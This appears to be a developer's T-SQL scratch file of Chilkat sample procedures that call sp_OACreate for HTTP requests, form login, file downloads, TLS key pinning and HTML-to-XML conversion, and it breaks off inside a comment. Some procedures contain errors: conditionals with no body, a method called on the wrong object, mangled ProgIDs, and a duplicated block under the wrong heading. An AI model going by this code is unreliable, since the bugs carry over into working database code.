------------------------------------------------------------------------------
------------------------------------------------------------------------------
--USE wh0d1n1;  
--GO  
--DECLARE @Object int;  
--DECLARE @HR int;  
--DECLARE @Property nvarchar(255);  
--DECLARE @Return nvarchar(255);  
--DECLARE @Source nvarchar(255), @Desc nvarchar(255);  
---- Create a SQLServer object.  
--SET NOCOUNT ON;  

---- First, create the object.  
--EXEC @HR = sp_OACreate N'SQLDMO.SQLServer',  
--    @Object OUT;  
--IF @HR <> 0  
--BEGIN  
--    -- Report the error.  
--    EXEC sp_OAGetErrorInfo @Object,  
--        @Source OUT,  
--        @Desc OUT;  
--    SELECT HR = convert(varbinary(4),@HR),  
--        Source=@Source,  
--        Description=@Desc;  
--    GOTO END_ROUTINE  
--END  
--ELSE  
---- A DMO.SQLServer object has been successfully created.  
--BEGIN  
--    -- Specify Windows Authentication for connections.  

--    EXEC @HR = sp_OASetProperty @Object,  
--        N'LoginSecure',  
--        N'TRUE';  
--    IF @HR <> 0 GOTO CLEANUP  
  
--    -- Set a property.  
--    EXEC @HR = sp_OASetProperty @Object,  
--        N'HostName',  
--        N'SampleScript';  
--    IF @HR <> 0 GOTO CLEANUP  
  
--    -- Get a property using an output parameter.  
--    EXEC @HR = sp_OAGetProperty @Object, N'HostName', @Property OUT;  
--    IF @HR <> 0   
--        GOTO CLEANUP  
--    ELSE  
--        PRINT @Property;  
  
--    -- Get a property using a result set.  
--    EXEC @HR = sp_OAGetProperty @Object,  
--        N'HostName';  
--    IF @HR <> 0 GOTO CLEANUP  
  
--    -- Get a property by calling the method.  
--    EXEC @HR = sp_OAMethod @Object,  
--        N'HostName',  
--        @Property OUT;  
--    IF @HR <> 0   
--        GOTO CLEANUP  
--    ELSE  
--        PRINT @Property;  
  
--    -- Call the connect method.  
--    -- SECURITY NOTE - When possible, use Windows Authentication.  
--    EXEC @HR = sp_OAMethod @Object,  
--        N'Connect',  
--        NULL,  
--        N'localhost',  
--        NULL,  
--        NULL;  
--    IF @HR <> 0 GOTO CLEANUP  
  
--    -- Call a method that returns a value.  
--    EXEC @HR = sp_OAMethod @Object,  
--        N'VerifyConnection',  
--        @Return OUT;  
--    IF @HR <> 0  
--        GOTO CLEANUP  
--    ELSE  
--        PRINT @Return;  
--END  
  
--CLEANUP:  
---- Check whether an error occurred.  
--IF @HR <> 0  
--BEGIN  
--    -- Report the error.  
--    EXEC sp_OAGetErrorInfo @Object,  
--        @Source OUT,  
--        @Desc OUT;  
--    SELECT HR = convert(varbinary(4),@HR),  
--        Source=@Source,  
--        Description=@Desc;  
--END  
  
---- Destroy the object.  
--BEGIN  
--    EXEC @HR = sp_OADestroy @Object;  
--    -- Check if an error occurred.  
--    IF @HR <> 0   
--    BEGIN  
--        -- Report the error.  
--        EXEC sp_OAGetErrorInfo @Object,  
--        @Source OUT,  
--        @Desc OUT;  
--        SELECT HR = convert(varbinary(4),@HR),  
--        Source=@Source,  
--        Description=@Desc;  
--    END  
--END  
  
--END_ROUTINE:  
--RETURN;  
--GO


--https://www.example-code.com/sql/http_json_request.asp


alter PROCEDURE http_json_request
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @http int
    EXEC @hr = sp_OACreate 'MSXML2.ServerXMLHttp', @http OUT
    IF @hr <> 0

    -- Add a few custom headers.
    EXEC sp_OAMethod @http, 'SetRequestHeader', NULL, 'Client-ID', 'my_client_id'
    EXEC sp_OAMethod @http, 'SetRequestHeader', NULL, 'Client-Token', 'my_client_token'

    EXEC sp_OASetProperty @http, 'Accept', 'application/json'

    DECLARE @url nvarchar(4000)
    SELECT @url = 'https://catalog.data.gov/api/3/action/package_search?rows=1&start=0'
    DECLARE @jsonRequestBody nvarchar(4000)
    SELECT @jsonRequestBody = '{ .... }'
    DECLARE @resp int
    EXEC sp_OAMethod @http, 'PostJson2', @resp OUT, @url, 'application/json', @jsonRequestBody
    --EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    --IF @iTmp0 = '0'
    --  BEGIN
    --    EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
    --    PRINT @sTmp0
    --    EXEC @hr = sp_OADestroy @http
    --    RETURN
    --  END


    EXEC sp_OAGetProperty @resp, 'StatusCode', @iTmp0 OUT
    PRINT 'Response status code = ' + cast(@iTmp0 as varchar(1))
    DECLARE @jsonResponseStr nvarchar(4000)
    EXEC sp_OAGetProperty @resp, 'BodyStr', @jsonResponseStr OUT


    print @jsonResponseStr


    EXEC @hr = sp_OADestroy @resp


    EXEC @hr = sp_OADestroy @http


END
GO

exec dbo.http_json_request


--https://www.example-code.com/sql/http_formAuthentication.asp



--<form method="post" action="/auth.nsf?Login">
--<input type="text" size="20" maxlength="256" name="username" id="user-id">
--<input type="password" size="20" maxlength="256" name="password" id="pw-id">
--<input type="hidden" name="redirectto" value="/web/demo.nsf/pgWelcome?Open">
--<input type="submit" value="Log In">
--</form>



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Let's begin by building an HTTP request to mimic the form.  
    -- We must add the parameters, and set the path.
    DECLARE @req int
    EXEC @hr = sp_OACreate 'HttpRequest', @req OUT

    EXEC sp_OAMethod @req, 'AddParam', NULL, 'username', 'mylogin'
    EXEC sp_OAMethod @req, 'AddParam', NULL, 'password', 'mypassword'
    EXEC sp_OAMethod @req, 'AddParam', NULL, 'redirectto', '/web/demo.nsf/pgWelcome?Open'

    -- The path part of the POST URL is obtained from the "action" attribute of the HTML form tag.
    EXEC sp_OASetProperty @req, 'Path', '/auth.nsf?Login'

    EXEC sp_OASetProperty @req, 'HttpVerb', 'POST'
    EXEC sp_OASetProperty @http, 'FollowRedirects', 1

    -- Collect cookies in-memory and re-send in subsequent HTTP requests, including any redirects.
    EXEC sp_OASetProperty @http, 'SendCookies', 1
    EXEC sp_OASetProperty @http, 'SaveCookies', 1
    EXEC sp_OASetProperty @http, 'CookieDir', 'memory'

    DECLARE @resp int

    EXEC sp_OAMethod @http, 'SynchronousRequest', @resp OUT, 'www.something123.com', 443, 1, @req
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @req
        RETURN
      END

    -- The HTTP response object can be examined.
    -- To get the HTML of the response, examine the BodyStr property (assuming the POST returns HTML)
    DECLARE @strHtml nvarchar(4000)
    EXEC sp_OAGetProperty @resp, 'BodyStr', @strHtml OUT

    EXEC @hr = sp_OADestroy @resp


    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @req


END
GO




https://www.example-code.com/sql/http_get_using_ssl_tls.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Send the HTTP GET and return the content in a string.
    DECLARE @html nvarchar(4000)
    EXEC sp_OAMethod @http, 'QuickGetStr', @html OUT, 'https://www.paypal.com/'


    PRINT @html

    EXEC @hr = sp_OADestroy @http


END
GO



--https://www.example-code.com/sql/http_downloadFile.asp

CREATE PROCEDURE http_downloadFile
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Fail'
        RETURN
    END

    -- Download a .zip
    DECLARE @localFilePath nvarchar(4000)
    SELECT @localFilePath = '/temp/hamlet.zip'
    DECLARE @success int
    EXEC sp_OAMethod @http, 'Download', @success OUT, 'http://www.chilkatsoft.com/hamlet.zip', @localFilePath
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        RETURN
      END

    -- Download an XML file:
    -- To download using SSL/TLS, simply use "https://" in the URL.
    SELECT @localFilePath = '/temp/hamlet.xml'
    EXEC sp_OAMethod @http, 'Download', @success OUT, 'https://www.chilkatsoft.com/hamlet.xml', @localFilePath
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        RETURN
      END


    PRINT 'OK!'

    EXEC @hr = sp_OADestroy @http


END
GO



--https://www.example-code.com/sql/http_public_key_pinning.asp


--openssl x509 -noout -in ssllabs.com.pem -pubkey | openssl asn1parse -noout -inform pem ---out ssllabs.com.key
--openssl dgst -sha256 -binary ssllabs.com.key | openssl enc -base64


CREATE PROCEDURE http_public_key_pinning
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @httpA int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @httpA OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- To do public key pinning, the SPKI fingerprint would be obtained beforehand -- perhaps
    -- at design time, or possibly at the time of the 1st connection (where the SPKI fingerprint
    -- is persisted for future use).  Note:  "If the certificate or public key is added upon first
    -- encounter, you will be using key continuity. Key continuity can fail if the attacker has a 
    -- privileged position during the first first encounter." 
    -- See https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning
    DECLARE @sslCert int
    EXEC sp_OAMethod @httpA, 'GetServerSslCert', @sslCert OUT, 'www.ssllabs.com', 443
    EXEC sp_OAGetProperty @httpA, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @httpA, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @httpA
        RETURN
      END

    -- The GetSpkiFingerprint method returns the SPKI Fingerprint suitable for use in pinning.

    EXEC sp_OAMethod @sslCert, 'GetSpkiFingerprint', @sTmp0 OUT, 'sha256', 'base64'
    PRINT 'SPKI Fingerprint: ' + @sTmp0
    EXEC @hr = sp_OADestroy @sslCert

    -- ------------------------------------------------------------------------------------

    -- At the time of writing this example (on 19-Dec-2015) the sha256/base64 SPKI fingerprint
    -- for the ssllabs.com server certificate is: xkWf9Qfs1uZi2NcMV3Gdnrz1UF4FNAslzApMTwynaMU=

    DECLARE @httpB int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @httpB OUT

    -- Set the TlsPinSet.  The format of the TlsPinSet string is:
    --  "hashAlg, encoding, fingerprint1, fingerprint2, ..."
    EXEC sp_OASetProperty @httpB, 'TlsPinSet', 'sha256, base64, xkWf9Qfs1uZi2NcMV3Gdnrz1UF4FNAslzApMTwynaMU='

    -- Our object will refuse to communicate with any TLS server where the server's public key
    -- does not match a pin in the pinset.

    -- This should be OK (assuming the ssllabs.com server certificate has not changed since
    -- the time of writing this example).
    DECLARE @html nvarchar(4000)
    EXEC sp_OAMethod @httpB, 'QuickGetStr', @html OUT, 'https://www.ssllabs.com/'
    EXEC sp_OAGetProperty @httpB, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @httpB, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @httpA
        EXEC @hr = sp_OADestroy @httpB
        RETURN
      END


    PRINT 'Success.  The HTTP GET worked because the server''s certificate had a matching public key.'

    -- This should NOT be OK because owasp.org's server certificate will not have a matching public key.
    EXEC sp_OAMethod @httpB, 'QuickGetStr', @html OUT, 'https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning'
    EXEC sp_OAGetProperty @httpB, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN

        PRINT 'Good, this connection was rejected...'
      END
    ELSE
      BEGIN

        PRINT 'This was not supposed to happen!'
        EXEC @hr = sp_OADestroy @httpA
        EXEC @hr = sp_OADestroy @httpB
        RETURN
      END

    EXEC @hr = sp_OADestroy @httpA
    EXEC @hr = sp_OADestroy @httpB


END
GO


--https://www.example-code.com/sql/http_addCookies.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @httpA int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @httpA OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- To do public key pinning, the SPKI fingerprint would be obtained beforehand -- perhaps
    -- at design time, or possibly at the time of the 1st connection (where the SPKI fingerprint
    -- is persisted for future use).  Note:  "If the certificate or public key is added upon first
    -- encounter, you will be using key continuity. Key continuity can fail if the attacker has a 
    -- privileged position during the first first encounter." 
    -- See https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning
    DECLARE @sslCert int
    EXEC sp_OAMethod @httpA, 'GetServerSslCert', @sslCert OUT, 'www.ssllabs.com', 443
    EXEC sp_OAGetProperty @httpA, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @httpA, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @httpA
        RETURN
      END

    -- The GetSpkiFingerprint method returns the SPKI Fingerprint suitable for use in pinning.

    EXEC sp_OAMethod @sslCert, 'GetSpkiFingerprint', @sTmp0 OUT, 'sha256', 'base64'
    PRINT 'SPKI Fingerprint: ' + @sTmp0
    EXEC @hr = sp_OADestroy @sslCert

    -- ------------------------------------------------------------------------------------

    -- At the time of writing this example (on 19-Dec-2015) the sha256/base64 SPKI fingerprint
    -- for the ssllabs.com server certificate is: xkWf9Qfs1uZi2NcMV3Gdnrz1UF4FNAslzApMTwynaMU=

    DECLARE @httpB int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @httpB OUT

    -- Set the TlsPinSet.  The format of the TlsPinSet string is:
    --  "hashAlg, encoding, fingerprint1, fingerprint2, ..."
    EXEC sp_OASetProperty @httpB, 'TlsPinSet', 'sha256, base64, xkWf9Qfs1uZi2NcMV3Gdnrz1UF4FNAslzApMTwynaMU='

    -- Our object will refuse to communicate with any TLS server where the server's public key
    -- does not match a pin in the pinset.

    -- This should be OK (assuming the ssllabs.com server certificate has not changed since
    -- the time of writing this example).
    DECLARE @html nvarchar(4000)
    EXEC sp_OAMethod @httpB, 'QuickGetStr', @html OUT, 'https://www.ssllabs.com/'
    EXEC sp_OAGetProperty @httpB, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @httpB, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @httpA
        EXEC @hr = sp_OADestroy @httpB
        RETURN
      END


    PRINT 'Success.  The HTTP GET worked because the server''s certificate had a matching public key.'

    -- This should NOT be OK because owasp.org's server certificate will not have a matching public key.
    EXEC sp_OAMethod @httpB, 'QuickGetStr', @html OUT, 'https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning'
    EXEC sp_OAGetProperty @httpB, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN

        PRINT 'Good, this connection was rejected...'
      END
    ELSE
      BEGIN

        PRINT 'This was not supposed to happen!'
        EXEC @hr = sp_OADestroy @httpA
        EXEC @hr = sp_OADestroy @httpB
        RETURN
      END

    EXEC @hr = sp_OADestroy @httpA
    EXEC @hr = sp_OADestroy @httpB


END
GO

--https://www.example-code.com/sql/http_authentication.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Set the Login and Password properties for authentication.
    EXEC sp_OASetProperty @http, 'Login', 'chilkat'
    EXEC sp_OASetProperty @http, 'Password', 'myPassword'

    -- To use HTTP Basic authentication..
    EXEC sp_OASetProperty @http, 'BasicAuth', 1

    DECLARE @html nvarchar(4000)
    EXEC sp_OAMethod @http, 'QuickGetStr', @html OUT, 'http://localhost/xyz.html'
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        RETURN
      END

    -- Examine the HTTP status code returned.  
    -- A status code of 401 is typically returned for "access denied"
    -- if no login/password is provided, or if the credentials (login/password)
    -- are incorrect.

    EXEC sp_OAGetProperty @http, 'LastStatus', @iTmp0 OUT
    PRINT 'HTTP status code for Basic authentication: ' + @iTmp0

    -- Examine the HTML returned for the URL:

    PRINT @html

    DECLARE @http2 int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http2 OUT

    -- To use NTLM authentication, set the 
    -- NtlmAuth property = 1
    EXEC sp_OASetProperty @http2, 'NtlmAuth', 1

    -- The session log can be captured to a file by
    -- setting the SessionLogFilename property:
    EXEC sp_OASetProperty @http2, 'SessionLogFilename', 'ntlmAuthLog.txt'

    -- Examination of the HTTP session log will show the NTLM
    -- back-and-forth exchange between the client and server.

    -- This call will now use NTLM authentication (assuming it
    -- is supported by the web server).
    EXEC sp_OAMethod @http2, 'QuickGetStr', @html OUT, 'http://localhost/xyz.html'
    -- Note: 
    EXEC sp_OAGetProperty @http2, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http2, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @http2
        RETURN
      END


    EXEC sp_OAGetProperty @http2, 'LastStatus', @iTmp0 OUT
    PRINT 'HTTP status code for NTLM authentication: ' + @iTmp0

    DECLARE @http3 int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http3 OUT

    -- To use Digest Authentication, set the DigestAuth property = 1
    -- Also, no more than one of the authentication type properties 
    -- (NtlmAuth, DigestAuth, and NegotiateAuth)  should be set
    -- to 1.  
    EXEC sp_OASetProperty @http3, 'DigestAuth', 1

    EXEC sp_OASetProperty @http3, 'SessionLogFilename', 'digestAuthLog.txt'

    -- This call will now use Digest authentication (assuming it
    -- is supported by the web server).
    EXEC sp_OAMethod @http3, 'QuickGetStr', @html OUT, 'http://localhost/xyz.html'
    EXEC sp_OAGetProperty @http3, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http3, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @http2
        EXEC @hr = sp_OADestroy @http3
        RETURN
      END


    EXEC sp_OAGetProperty @http3, 'LastStatus', @iTmp0 OUT
    PRINT 'HTTP status code for Digest authentication: ' + @iTmp0

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @http2
    EXEC @hr = sp_OADestroy @http3


END
GO


---https://www.example-code.com/sql/http_debugging.asp


CREATE PROCEDURE http_debugging
AS
BEGIN
    DECLARE @hr int
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- This example demonstrates session logging via the
    -- SessionLogFilename property.  It also examines the 
    -- contents of the LastErrorText and a few other properties
    -- to see what transpired in a seemingly simple HTTP GET request.

    EXEC sp_OASetProperty @http, 'SessionLogFilename', '/temp/httpSessionLog.txt'

    -- The "http://www.paypal.com" URL was chosen on
    -- purpose to demonstrate the potential complexity
    -- of a seemingly simple HTTP GET request and response.
    -- 
    -- In this case, the initial response is a 301 redirect to
    -- "https://www.paypal.com/" because all communication
    -- with PayPal must be over SSL/TLS.  The Chilkat HTTP
    -- FollowRedirects property defaults to 1, causing the
    -- redirect to be followed automatically.  
    -- The request is resent using SSL/TLS and the response
    -- received is a complex one:  it is both Gzipped (compressed)
    -- and "chunked".  Internally, Chilkat automatically handles
    -- the decompression and the re-composing of the chunked
    -- response to return the simple HTML page that is the result.
    DECLARE @html nvarchar(4000)

    EXEC sp_OAMethod @http, 'QuickGetStr', @html OUT, 'http://www.paypal.com/'

    -- Looking at the httpSessionLog, we can see the initial
    -- HTTP request, the 301 response, the subsequent 
    -- HTTP GET request to follow the redirect, and the final
    -- gzipped/chunked response:

    -- ---- Sending ----
    -- GET / HTTP/1.1
    -- Accept: */*
    -- Accept-Encoding: gzip
    -- Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    -- Accept-Language: en-us,en;q=0.5
    -- Host: www.paypal.com
    -- Connection: Keep-Alive
    -- 
    -- 
    -- ---- Received ----
    -- HTTP/1.1 301 Moved Permanently
    -- Date: Sat, 25 Jun 2011 14:50:36 GMT
    -- Server: Apache
    -- Set-Cookie: cwrClyrK4LoCV1fydGbAxiNL6iG..; domain=.paypal.com; path=/; HttpOnly
    -- Set-Cookie: cookie_check=yes; expires=Tue, 22-Jun-2021 14:50:37 GMT; domain=.paypal.com; path=/; HttpOnly
    -- Location: https://www.paypal.com/
    -- Vary: Accept-Encoding
    -- Content-Encoding: gzip
    -- Keep-Alive: timeout=5, max=100
    -- Connection: Keep-Alive
    -- Transfer-Encoding: chunked
    -- Content-Type: text/html
    -- 
    -- 10
    -- (10 bytes of binary (non-printable) data here...)
    -- 
    -- ---- Sending ----
    -- GET / HTTP/1.1
    -- Accept: */*
    -- Accept-Encoding: gzip
    -- Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    -- Accept-Language: en-us,en;q=0.5
    -- Host: www.paypal.com
    -- Connection: Keep-Alive
    -- 
    -- 
    -- ---- Received ----
    -- HTTP/1.1 200 OK
    -- Date: Sat, 25 Jun 2011 14:50:37 GMT
    -- Server: Apache
    -- Cache-Control: private
    -- Pragma: no-cache
    -- Expires: Thu, 05 Jan 1995 22:00:00 GMT
    -- Set-Cookie: cwrClyrK4DoCV1fydGbAxiNL6iG=jE8s ...; domain=.paypal.com; path=/; Secure; HttpOnly
    -- Set-Cookie: KHcl0EuY7AKSMgfvHl7J5E7hPtK=YSG ...; expires=Fri, 20-Jun-2031 14:50:38 GMT; 
    --  domain=.paypal.com; path=/; Secure; HttpOnly
    -- Set-Cookie: cookie_check=yes; expires=Tue, 22-Jun-2021 14:50:38 GMT; domain=.paypal.com; path=/; 
    --  Secure; HttpOnly
    -- Set-Cookie: navcmd=_home-general; domain=.paypal.com; path=/; Secure; HttpOnly
    -- Set-Cookie: consumer_display=USER_HOMEPAGE...;
    --  expires=Tue, 22-Jun-2021 14:50:38 GMT; domain=.paypal.com; path=/; Secure; HttpOnly
    -- Set-Cookie: navlns=0.0; expires=Fri, 20-Jun-2031 14:50:38 GMT; domain=.paypal.com; path=/; Secure; HttpOnly
    -- Set-Cookie: Apache=10.73.8.36.1309013437867506; path=/; expires=Mon, 17-Jun-41 14:50:37 GMT
    -- Vary: Accept-Encoding
    -- Content-Encoding: gzip
    -- Strict-Transport-Security: max-age=500
    -- Keep-Alive: timeout=5, max=100
    -- Connection: Keep-Alive
    -- Transfer-Encoding: chunked
    -- Content-Type: text/html; charset=UTF-8
    -- 
    -- 1895
    -- (The remainder of the HTTP response is binary data.)

    EXEC @hr = sp_OADestroy @http


END
GO;


--https://www.example-code.com/sql/htmlToXml_simple.asp


CREATE PROCEDURE htmlToXml_simple
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @htmlToXml int
    EXEC @hr = sp_OACreate 'htmlToXml_simple.HtmlToXml', @htmlToXml OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Indicate the charset of the output XML we'll want.
    EXEC sp_OASetProperty @htmlToXml, 'XmlCharset', 'utf-8'

    -- Set the HTML:
    EXEC sp_OASetProperty @htmlToXml, 'Html', '<html><body><p>This is a test <a href="http://www.chilkatsoft.com/">Chilkat Software</a></body></html>'

    -- Get the XML:
    EXEC sp_OAMethod @htmlToXml, 'ToXml', @sTmp0 OUT
    PRINT @sTmp0

    -- This is the output:
    -- <?xml version="1.0" encoding="utf-8" ?>
    -- 
    -- <root>
    --     <html>
    --         <body>
    --             <p>
    --                 <text>This is a test </text>
    --                 <a href="http://www.chilkatsoft.com/">
    --                     <text>Chilkat Software</text>
    --                 </a>
    --             </p>
    --         </body>
    --     </html>
    -- </root

    EXEC @hr = sp_OADestroy @htmlToXml


END
GO

--https://www.example-code.com/sql/htmlToXml_webPage.asp

CREATE PROCEDURE htmlToXml_webPage
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    --  Note: This example requires the Chilkat Bundle license.

    --  Any string argument automatically begins the 30-day trial.
    DECLARE @glob int
    EXEC @hr = sp_OACreate 'htmlToXml_webPage.Global', @glob OUT
    IF @hr <> 0

    DECLARE @success int
    EXEC sp_OAMethod @glob, 'UnlockBundle', @success OUT, '30-day trial'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @glob, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @glob
        RETURN
      END

    DECLARE @http int
    EXEC @hr = sp_OACreate 'htmlToXml_webPage.Http', @http OUT

    DECLARE @html nvarchar(4000)

    EXEC sp_OAMethod @http, 'QuickGetStr', @html OUT, 'http://www.intel.com/'
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @glob
        EXEC @hr = sp_OADestroy @http
        RETURN
      END

    DECLARE @htmlToXml int
    EXEC @hr = sp_OACreate 'htmlToXml_webPage.HtmlToXml', @htmlToXml OUT

    --  Indicate the charset of the output XML we'll want.
    EXEC sp_OASetProperty @htmlToXml, 'XmlCharset', 'utf-8'

    --  Set the HTML:
    EXEC sp_OASetProperty @htmlToXml, 'Html', @html

    --  Convert to XML:
    DECLARE @xml nvarchar(4000)

    EXEC sp_OAMethod @htmlToXml, 'ToXml', @xml OUT

    --  Save the XML to a file.
    --  Make sure your charset here matches the charset
    --  used for the XmlCharset property.
    EXEC sp_OAMethod @htmlToXml, 'WriteStringToFile', @success OUT, @xml, 'out.xml', 'utf-8'


    PRINT 'Finished.'

    EXEC @hr = sp_OADestroy @glob
    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @htmlToXml


END
GO


--https://www.example-code.com/sql/html_table_to_text.asp

CREATE PROCEDURE html_table_to_text
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- 
    --  <table><tr><th>
    --  <p>Property</p></th><th scope="col"><p>Type</p></th><th
    --  scope="col"><p>R/W</p></th><th scope="col"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/jj164022.aspx#NavigationProperties">
    --  Returned with resource</a></p></th><th
    --  scope="col"><p>Description</p></th></tr><tr><td
    --  data-th="Property"><p>Author</p></td><td data-th="Type"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/dn531432.aspx#bk_User">
    --  SP.User</a></p></td><td data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>No</p></td><td data-th="Description"><p>Gets a value that 
-- specifies the user who added the file.</p></td></tr><tr><td
    --  data-th="Property"><p>CheckedOutByUser</p></td><td data-th="Type"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/dn531432.aspx#bk_User">
    --  SP.User</a></p></td><td data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>No</p></td><td data-th="Description"><p>Gets a value that returns 
-- the user who has checked out the file.</p></td></tr><tr><td
    --  data-th="Property"><p>CheckInComment</p></td><td data-th="Type"><p><span
    --  class="input">String</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that returns the comment used when a
    --  document is checked in to a document library.</p></td></tr><tr><td
    --  data-th="Property"><p>CheckOutType</p></td><td data-th="Type"><p><span
    --  class="input">Int32</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that indicates how the file is checked
